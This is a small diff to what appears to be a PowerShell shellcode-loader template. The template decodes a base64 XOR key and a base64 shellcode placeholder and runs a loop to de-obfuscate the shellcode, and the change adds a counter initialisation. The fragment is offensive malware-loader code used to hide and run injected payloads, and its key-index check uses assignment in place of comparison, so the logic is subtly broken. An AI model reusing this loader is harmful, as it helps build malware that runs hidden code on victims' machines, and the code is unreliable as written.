@@ -488,6 +488,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
 }
 $k = [System.Convert]::frombase64string("##BASE64KEY##");
 $sc = [System.Convert]::frombase64string("##BASE64SHELLCODE##");
+$ki=0;
 for($i=0;$i -lt $sc.Length;$i++){
     if($ki=$k.Length){
         $ki=0;
